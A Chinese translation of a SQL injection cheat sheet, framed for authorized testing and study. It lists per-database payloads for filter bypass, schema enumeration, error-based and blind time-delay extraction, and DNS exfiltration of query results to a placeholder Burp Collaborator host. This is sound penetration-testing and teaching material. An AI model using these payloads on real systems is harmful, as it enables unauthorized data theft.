

> 说明：本文为原速查表的中文翻译，仅用于授权安全测试、防御学习和漏洞复现环境。

---

# SQL 注入速查表

本 SQL 注入速查表包含一些有用语法的示例，可用于执行 SQL 注入攻击中经常出现的各种任务。

## 字符串拼接

你可以将多个字符串拼接成一个字符串。

| 数据库 | 语法 |
|---|---|
| Oracle | `'foo'||'bar'` |
| Microsoft | `'foo'+'bar'` |
| PostgreSQL | `'foo'||'bar'` |
| MySQL | `'foo' 'bar'`（注意两个字符串之间的空格）<br>`CONCAT('foo','bar')` |

## 子字符串

你可以从指定偏移量开始、按指定长度提取字符串的一部分。注意：偏移量索引从 1 开始。以下每个表达式都会返回字符串 `ba`。

| 数据库 | 语法 |
|---|---|
| Oracle | `SUBSTR('foobar', 4, 2)` |
| Microsoft | `SUBSTRING('foobar', 4, 2)` |
| PostgreSQL | `SUBSTRING('foobar', 4, 2)` |
| MySQL | `SUBSTRING('foobar', 4, 2)` |

## 注释

你可以使用注释来截断查询，并删除原始查询中位于你的输入之后的部分。

| 数据库 | 语法 |
|---|---|
| Oracle | `--comment` |
| Microsoft | `--comment`<br>`/*comment*/` |
| PostgreSQL | `--comment`<br>`/*comment*/` |
| MySQL | `#comment`<br>`-- comment`（注意双横线后有一个空格）<br>`/*comment*/` |

## 绕过过滤器

如果应用程序阻止了特定关键字或字符，你可能仍然可以使用以下技术注入 SQL。基于编码的绕过方式，例如对关键字进行 URL 编码或使用 `CHAR()` 构造字符串，会在“使用编码混淆攻击”中单独介绍。

SQL 关键字不区分大小写，因此你可以改变输入的大小写，以绕过阻止特定关键字的过滤器。例如，如果 `SELECT` 被阻止，可以尝试 `SeLeCT`。

你还可以使用内联注释代替空白，这样，查找“关键字前后带空格”的过滤器就不会匹配。例如：

```sql
SELECT/**/username/**/FROM/**/users
```

在 MySQL 上，你可以使用版本化注释，让关键字对过滤器隐藏，同时仍由数据库执行。数据库会执行 `/*! ... */` 注释中的内容，因此 `/*!SELECT*/` 会被当作 `SELECT` 处理。

## 数据库版本

你可以查询数据库，以确定其类型和版本。在构造更复杂的攻击时，这些信息很有用。

| 数据库 | 语法 |
|---|---|
| Oracle | `SELECT banner FROM v$version`<br>`SELECT version FROM v$instance` |
| Microsoft | `SELECT @@version` |
| PostgreSQL | `SELECT version()` |
| MySQL | `SELECT @@version` |

## 数据库内容

你可以列出数据库中存在的表，以及这些表包含的列。

| 数据库 | 语法 |
|---|---|
| Oracle | `SELECT * FROM all_tables`<br>`SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'` |
| Microsoft | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| PostgreSQL | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |
| MySQL | `SELECT * FROM information_schema.tables`<br>`SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'` |

## 条件错误

你可以测试单个布尔条件，并在条件为真时触发数据库错误。

| 数据库 | 语法 |
|---|---|
| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual` |
| Microsoft | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` |
| PostgreSQL | `1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` |

## 通过可见错误消息提取数据

你可能可以诱使错误消息泄露由恶意查询返回的敏感数据。

### Microsoft

```sql
SELECT 'foo' WHERE 1 = (SELECT 'secret')
```

返回：

```text
Conversion failed when converting the varchar value 'secret' to data type int.
```

### PostgreSQL

```sql
SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
```

返回：

```text
invalid input syntax for integer: "secret"
```

### MySQL

```sql
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
```

返回：

```text
XPATH syntax error: '\secret'
```

## 批量（或堆叠）查询

你可以使用批量查询来连续执行多个查询。注意：后续查询会执行，但结果不会返回给应用程序。因此，这种技术主要用于盲注漏洞：你可以使用第二个查询触发 DNS 查询、条件错误或时间延迟。

| 数据库 | 语法 |
|---|---|
| Oracle | 不支持批量查询。 |
| Microsoft | `QUERY-1-HERE; QUERY-2-HERE`<br>`QUERY-1-HERE QUERY-2-HERE` |
| PostgreSQL | `QUERY-1-HERE; QUERY-2-HERE` |
| MySQL | `QUERY-1-HERE; QUERY-2-HERE` |

**注意：**

在 MySQL 中，批量查询通常不能用于 SQL 注入。不过，如果目标应用程序使用某些 PHP 或 Python API 与 MySQL 数据库通信，偶尔也可能实现。

## 时间延迟

你可以在查询处理时造成数据库时间延迟。以下语句会造成无条件的 10 秒时间延迟。

| 数据库 | 语法 |
|---|---|
| Oracle | `dbms_pipe.receive_message(('a'),10)` |
| Microsoft | `WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT pg_sleep(10)` |
| MySQL | `SELECT SLEEP(10)` |

## 条件时间延迟

你可以测试单个布尔条件，并在条件为真时触发时间延迟。

| 数据库 | 语法 |
|---|---|
| Oracle | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual` |
| Microsoft | `IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'` |
| PostgreSQL | `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END` |
| MySQL | `SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')` |

## DNS 查询

你可以使数据库对外部域执行 DNS 查询。为此，你需要使用 Burp Collaborator 生成一个唯一的 Burp Collaborator 子域，在攻击中使用它，然后轮询 Collaborator 服务器以确认是否发生了 DNS 查询。

### Oracle

利用 XXE 漏洞触发 DNS 查询。该漏洞已被修补，但现实中仍存在许多未修补的 Oracle 安装：

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

以下技术在已完全打补丁的 Oracle 安装上有效，但需要高权限：

```sql
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
```

### Microsoft

```sql
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a'
```

### PostgreSQL

```sql
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

### MySQL

以下技术仅在 Windows 上有效：

```sql
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
```

```sql
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

## 带数据外带的 DNS 查询

你可以使数据库对外部域执行 DNS 查询，并在该域名中包含注入查询的结果。为此，你需要使用 Burp Collaborator 生成一个唯一的 Burp Collaborator 子域，在攻击中使用它，然后轮询 Collaborator 服务器以获取任何 DNS 交互的详细信息，包括外带的数据。

### Oracle

```sql
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
```

### Microsoft

```sql
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
```

### PostgreSQL

```sql
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f();
```

### MySQL

以下技术仅在 Windows 上有效：

```sql
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
```

---


